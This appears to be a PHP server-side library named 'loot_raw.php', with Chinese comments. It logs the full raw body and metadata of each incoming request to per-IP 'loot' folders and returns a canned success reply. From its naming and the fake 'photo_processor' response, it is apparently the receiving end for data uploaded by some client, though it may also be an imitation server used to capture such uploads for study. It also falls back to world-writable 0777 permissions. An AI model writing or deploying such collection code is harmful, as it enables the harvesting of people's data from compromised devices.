<?php
// loot_raw.php —— core 上报数据的原始落盘公共库（供 /api/user/* 端点调用）
// 全部原始请求（body + headers）按设备 IP 分桶存储，供离线解析。

function loot_store($endpoint) {
    $ip = isset($_SERVER['REMOTE_ADDR']) ? $_SERVER['REMOTE_ADDR'] : 'unknown';
    $ip = preg_replace('/[^0-9a-fA-F\.\:]/', '_', $ip);
    $base = '/www/wwwroot/i.131422.com/loot/' . $ip;
    if (!is_dir($base)) {
        @mkdir($base, 0775, true);
    }
    if (!is_writable($base)) { @chmod($base, 0775); if (!is_writable($base)) { @chmod($base, 0777); } }
    $ts = round(microtime(true) * 1000);
    $body = file_get_contents('php://input');
    $meta = array(
        'ts' => $ts,
        'endpoint' => $endpoint,
        'method' => isset($_SERVER['REQUEST_METHOD']) ? $_SERVER['REQUEST_METHOD'] : '',
        'uri' => isset($_SERVER['REQUEST_URI']) ? $_SERVER['REQUEST_URI'] : '',
        'content_type' => isset($_SERVER['CONTENT_TYPE']) ? $_SERVER['CONTENT_TYPE'] : '',
        'content_length' => isset($_SERVER['CONTENT_LENGTH']) ? $_SERVER['CONTENT_LENGTH'] : '',
        'user_agent' => isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : '',
        'query' => isset($_SERVER['QUERY_STRING']) ? $_SERVER['QUERY_STRING'] : '',
        'body_size' => strlen($body),
        'http_timestamp' => isset($_SERVER['HTTP_TIMESTAMP']) ? $_SERVER['HTTP_TIMESTAMP'] : '',
    );
    $fname = 'raw_' . $endpoint . '_' . $ts;
    file_put_contents($base . '/' . $fname . '.bin', $body);
    file_put_contents($base . '/' . $fname . '.meta.json', json_encode($meta, JSON_UNESCAPED_SLASHES));
    return array($ip, $fname);
}

function loot_json_ok($extra = array()) {
    $r = array('code' => 0, 'msg' => 'ok', 'data' => array('photo_processor' => true));
    foreach ($extra as $k => $v) { $r[$k] = $v; }
    header('Content-Type: application/json');
    echo json_encode($r, JSON_UNESCAPED_SLASHES);
}
